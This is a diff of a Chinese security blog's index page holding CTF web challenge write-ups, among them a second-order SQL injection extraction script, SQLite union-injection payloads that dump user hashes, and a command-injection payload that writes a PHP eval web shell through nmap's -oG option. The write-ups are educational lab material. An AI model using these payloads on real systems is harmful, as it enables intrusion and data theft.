class="number">100k</span>;  <span class="comment">#每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span> <span class="number">65</span>;  <span class="comment">#连接超时时间，默认为75s，可以在http，server，location块。</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">upstream</span> mysvr &#123;   </span><br><span class="line">      <span class="attribute">server</span> <span class="number">127.0.0.1:7878</span>;</span><br><span class="line">      <span class="attribute">server</span> <span class="number">192.168.10.121:3333</span> backup;  <span class="comment">#热备</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">404</span> https://www.baidu.com; <span class="comment">#错误页</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">keepalive_requests</span> <span class="number">120</span>; <span class="comment">#单连接请求上限次数。</span></span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">4545</span>;   <span class="comment">#监听端口</span></span><br><span class="line">        <span class="attribute">server_name</span>  <span class="number">127.0.0.1</span>;   <span class="comment">#监听地址       </span></span><br><span class="line">        <span class="attribute">location</span>  ~*^.+$ &#123;       <span class="comment">#请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。</span></span><br><span class="line">           <span class="comment">#root path;  #根目录</span></span><br><span class="line">           <span class="comment">#index vv.txt;  #设置默认页</span></span><br><span class="line">           <span class="attribute">proxy_pass</span>  http://mysvr;  <span class="comment">#请求转向mysvr 定义的服务器列表</span></span><br><span class="line">           <span class="attribute">deny</span> <span class="number">127.0.0.1</span>;  <span class="comment">#拒绝的ip</span></span><br><span class="line">           <span class="attribute">allow</span> <span class="number">172.18.5.54</span>; <span class="comment">#允许的ip           </span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>   几个常见配置项：</p>
+<ul>
+<li>1.$remote_addr 与 $http_x_forwarded_for 用以记录客户端的ip地址；</li>
+<li>2.$remote_user ：用来记录客户端用户名称；</li>
+<li>3.$time_local ： 用来记录访问时间与时区；</li>
+<li>4.$request ： 用来记录请求的url与http协议；</li>
+<li>5.$status ： 用来记录请求状态；成功是200；</li>
+<li>6.$body_bytes_s ent ：记录发送给客户端文件主体内容大小；</li>
+<li>7.$http_referer ：用来记录从那个页面链接访问过来的；</li>
+<li>8.$http_user_agent ：记录客户端浏览器的相关信息；</li>
+</ul>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/" class="post-title-link" itemprop="url">网鼎杯-2018-unfinish</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-17 13:36:46 / 修改时间：15:01:09" itemprop="dateCreated datePublished" datetime="2021-03-17T13:36:46+08:00">2021-03-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h5 id="网鼎杯-2018-unfinish"><a href="#网鼎杯-2018-unfinish" class="headerlink" title="网鼎杯-2018-unfinish"></a>网鼎杯-2018-unfinish</h5><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>进入题目，是一个/login.php，放到御剑扫：</p>
+<img src="/images/网鼎杯-2018-unfinish/image-20210317133844360.png" alt="image-20210317133844360" style="zoom:70%;" />
+
+<p>有注册界面，随便注册一个看看：</p>
+<img src="/images/网鼎杯-2018-unfinish/image-20210317134024989.png" alt="image-20210317134024989" style="zoom:80%;" />
+
+<p>什么都没有……左边有一个侧边栏可以看到注册的用户名</p>
+<p>各种方法都试了一下，都没有成功……在注册时发现用户名（username）加单引号时，界面回显不同，应该是插入数据库时’导致语句的格式错误……（应该先搞懂sql插入语句的……）</p>
+<blockquote>
+<p><strong>SQL INSERT INTO 语句</strong>：</p>
+<p>INSERT INTO 表名称 VALUES (值1, 值2,….)</p>
+<img src="/images/网鼎杯-2018-unfinish/image-20210317140715985.png" alt="image-20210317140715985" style="zoom:60%;" />
+</blockquote>
+<p>题目中的sql插入语句就有可能是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">value</span>(<span class="string">&#x27;$email&#x27;</span>,<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>题目中，email和password好像都很难注入……测试时也只有改动username时回显不同</p>
+<p>闭合引号’)#似乎不行，语句可能是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tablename (email,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;$email&#x27;</span>,<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>dalao操作似乎是利用mysql中的”加法“结合hex加密：</p>
+<blockquote>
+<p>**mysql中加号(+)**：</p>
+<p>①如果双方都为数值型数据则结果为数值相加结果;</p>
+<p>②如果有一方为字符型，则试图将字符型数值转换成数值型，如果转换成功，则继续做数值加法运算；</p>
+<p>③如果有一方为null，则结果肯定为null。</p>
+</blockquote>
+<p>也就是说，直接0’ + database() +’0，实际上是0+0+<strong>int</strong>(database())，而结果开头为字母，即结果为<strong>0</strong></p>
+<p>如果是version()：</p>
+<img src="/images/网鼎杯-2018-unfinish/image-20210317144848852.png" alt="image-20210317144848852" style="zoom:70%;" />
+
+<p>version()的显示只剩下了<strong>5.5</strong>，后面的数据都么有了</p>
+<p>可以利用双重hex加密或ord与ascii使返回结果为数字；另，若返回数字超过十位，会以科学计数法返回，造成数据损失……(还有，表名flag竟然是猜的,把information_schema禁了……</p>
+<p>写脚本批量注册与登录，获取username数据：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#注册：</span></span><br><span class="line">url1 = <span class="string">&#x27;http://111.200.241.244:33496/register.php&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"> register = &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>: <span class="built_in">str</span>(x)+<span class="string">&quot;@qqq.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;0&#x27;+( substr(hex(hex((select * from flag ))) from &quot;</span>+<span class="built_in">str</span>((x<span class="number">-1</span>)*<span class="number">10</span>+<span class="number">1</span>)+<span class="string">&quot; for 10))+&#x27;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response1 = requests.post(url=url1, data=register)</span><br><span class="line"></span><br><span class="line"><span class="comment">#登录，查username</span></span><br><span class="line">url2 = <span class="string">&#x27;http://111.200.241.244:33496/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    login = &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>: <span class="built_in">str</span>(x)+<span class="string">&quot;@qqq.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response2 = requests.post(url=url2, data=login)</span><br><span class="line">    r = response2.text</span><br><span class="line">    left = r.find(<span class="string">&#x27;            &#x27;</span>)</span><br><span class="line">    right = r.find(<span class="string">&#x27;&lt;/span&gt;&#x27;</span>)</span><br><span class="line">    con = r[left:right].strip()</span><br><span class="line">    content += con</span><br><span class="line">    print(con)</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/image-20210317145756747.png" alt="image-20210317145756747"></p>
+<blockquote>
+<p>没写停止，一下全输出了……</p>
+</blockquote>
+<p>hex解密：</p>
+<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/image-20210317145858429.png" alt="image-20210317145858429"></p>
+<blockquote>
+<p>这好像叫做二次注入……和我理解的好像不一样，那上次用cookie回显是不是也算二次注入……</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/14/XML/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -506,573 +1089,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/09/BUUCTF-2018-Online-Tool/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/09/BUUCTF-2018-Online-Tool/" class="post-title-link" itemprop="url">BUUCTF-2018-Online-Tool</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-03-09 15:05:32 / 修改时间：17:07:10" itemprop="dateCreated datePublished" datetime="2021-03-09T15:05:32+08:00">2021-03-09</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h5 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h5><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><blockquote>
-<p>关于escapeshellarg和escapeshellcmd</p>
-<p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
-<p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p>
-<p><strong>escapeshellcmd</strong> — shell 元字符转义</p>
-<p><strong>功能</strong>：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.exec.php">exec()</a> 或 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。</p>
-<p>反斜线（\）会在以下字符之前插入： <em>&amp;#;`|\</em>?~&lt;&gt;^()[]{}$<em>, <em>\x0A</em> 和 <em>\xFF\</em>。 \</em>’* 和 <em>“</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p>
-</blockquote>
-<p>好像因为环境问题？本地测试不是很对……参考dalao：<a href="%5Bhttp://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/%5D(http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/)">谈谈escapeshellarg参数绕过和注入的问题</a></p>
-<p>由于先使用<strong>escapeshellarg</strong>，再使用<strong>escapeshellcmd</strong>导致的命令执行漏洞</p>
-<p>在线php测试成功了……：</p>
-<p><img src="/images/BUUCTF-2018-Online-Tool/image-20210309164414644.png" alt="image-20210309164414644"></p>
-<p>‘’   \   ‘’    A    ‘\‘   ‘’  ：这样显示，单引号都被闭合了，传入参数就可以成为命令执行</p>
-<p><img src="/images/BUUCTF-2018-Online-Tool/image-20210309165949036.png" alt="image-20210309165949036"></p>
-<blockquote>
-<p>单引号前后要加空格，防止格式改变或后缀改变</p>
-</blockquote>
-<p>结合：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/107336#h3-5">利用/绕过 PHP escapeshellarg/escapeshellcmd函数</a></p>
-<p>可知，需要利用预置的命令，拼接执行；这里关系到namp的命令</p>
-<p>namp命令有保存扫描结果的命令：</p>
-<blockquote>
-<p><strong>Nmap输出格式</strong></p>
-<ul>
-<li>-oN <filespec> (标准输出)</li>
-<li>-oX <filespec> (XML输出)</li>
-<li>-oS <filespec> (ScRipT KIdd|3 oUTpuT)</li>
-<li>-oG <filespec> (Grep输出)</li>
-<li>-oA <basename> (输出至所有格式)</li>
-<li><a target="_blank" rel="noopener" href="http://www.nmap.com.cn/doc/manual.shtm#12">namp中文网#输出</a></li>
-</ul>
-</blockquote>
-<p>在保存结果的同时，可以向文件中写入语句，这里写入一句话即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;ok&quot;]);?&gt; -oG 1.php &#39;</span><br></pre></td></tr></table></figure>
-
-<p>sandbox指明文件目录，antsword链接：</p>
-<p><img src="/images/BUUCTF-2018-Online-Tool/image-20210309170613645.png" alt="image-20210309170613645"></p>
-<p>获取flag</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/04/xctf-FlatScience/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/04/xctf-FlatScience/" class="post-title-link" itemprop="url">xctf-FlatScience</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-03-04 16:56:21 / 修改时间：17:35:02" itemprop="dateCreated datePublished" datetime="2021-03-04T16:56:21+08:00">2021-03-04</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="xctf-FlatScience"><a href="#xctf-FlatScience" class="headerlink" title="xctf-FlatScience"></a>xctf-FlatScience</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>这道题…………</p>
-<p>打开上面写着：Best Papers，最好的论文，链接了好多paper，还是全英的……</p>
-<p>查看robots.txt，找到login和admin页面，login页面源码发现注释：</p>
-<p><img src="/images/xctf-FlatScience/image-20210304170216778.png" alt="image-20210304170216778"></p>
-<blockquote>
-<p>我看不懂，但我……</p>
-</blockquote>
-<p>在一通乱试下，原来是在login.php?debug……大概是个所谓的调试界面吧</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.$user.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.sha1($pass.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.$row[<span class="string">&#x27;name&#x27;</span>], time() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            header(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line">highlight_file(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>sqlite的注入：</p>
-<p>使usr=admin’ or ‘1’=1发现页面跳转，cookie中有值为+admin的记录，本来想直接盲注，但发现sqlite似乎没有if function……学习一下sqlite的注入</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627">dalao</a></p>
-<blockquote>
-<p><strong>sqlite_master隐藏表：</strong></p>
-<p>字段：type/name/tbl_name/rootpage/sql</p>
-<p>type列记录了项目的类型，如table、index、view、trigger。</p>
-<p>name列记录了项目的名称，如表名、索引名等。</p>
-<p>tbl_name列记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。</p>
-<p>rootpage列记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。</p>
-<p>sql列记录创建该项目的SQL语句。</p>
-<p>**sqlite_version()**：版本号</p>
-</blockquote>
-<p>用order by 判断表有两列，换掉admin并union select 1，2可以看到cookie值变为+2，那就不用盲注了。sqlite没有concat但有group_concat……害</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查表名：</span><br><span class="line">usr&#x3D;0&#39; union select 1,(select tbl_name from sqlite_master where type&#x3D;&#39;table&#39;)--</span><br><span class="line">查列名：</span><br><span class="line">usr&#x3D;0&#39; union select 1,(select sql from sqlite_master where type&#x3D;&#39;table&#39;)--</span><br><span class="line">查数据：</span><br><span class="line">usr&#x3D;0&#39; union select 1,(select group_concat(hint) from Users)--</span><br></pre></td></tr></table></figure>
-
-<p>结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sql：</span><br><span class="line">CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</span><br><span class="line"></span><br><span class="line">id： 	  1,2,3</span><br><span class="line"></span><br><span class="line">name： 	  admin,fritze,hansi</span><br><span class="line"></span><br><span class="line">password： 3fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line">	       ,</span><br><span class="line">	       54eae8935c90f467427f05e4ece82cf569f89507</span><br><span class="line">	       ,</span><br><span class="line">	       34b0bb7c304949f9ff2fc101eef0f048be10d3bd</span><br><span class="line"></span><br><span class="line">hint：	  my fav word in my fav paper?!,my love is…?,the password is password</span><br></pre></td></tr></table></figure>
-
-<p>还在打谜语……大概是paper里有一个词是密码吧……查一波，发现这还涉及到pdf转txt……</p>
-<p>奈何太菜，脚本也看不懂，贴大佬链接吧：</p>
-<p><a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-705026.html">dalao2</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/harry_c/article/details/101773526">dalao3</a></p>
-<p>密码是：ThinJerboa</p>
-<blockquote>
-<p>wohaocai，6LCc6K+t5Lq65rua5Ye65ZOl6LCt5biC==</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/04/xctf-csaw-2016-quals-mfw/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/04/xctf-csaw-2016-quals-mfw/" class="post-title-link" itemprop="url">xctf-csaw-2016-quals-mfw</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-03-04 12:29:38 / 修改时间：14:19:42" itemprop="dateCreated datePublished" datetime="2021-03-04T12:29:38+08:00">2021-03-04</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="xctf-csaw-2016-quals-mfw"><a href="#xctf-csaw-2016-quals-mfw" class="headerlink" title="xctf-csaw-2016-quals-mfw"></a>xctf-csaw-2016-quals-mfw</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>打开是一个网页，点击about：</p>
-<p><img src="/images/xctf-csaw-2016-quals-mfw/image-20210304123209659.png" alt="image-20210304123209659"></p>
-<p>题目提示使用了git，推测存在.git源码泄露：</p>
-<p><img src="/images/xctf-csaw-2016-quals-mfw/image-20210304123314880.png" alt="image-20210304123314880">        </p>
-<p>访问发现网站目录，用GitHack获取源码：</p>
-<blockquote>
-<p>GitHack在python2下运行，使用方法：python2 GitHack.py [指定url]</p>
-</blockquote>
-<img src="/images/xctf-csaw-2016-quals-mfw/image-20210304123716586.png" alt="image-20210304123716586" style="zoom:90%;" />
-
-<p>index.php：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span 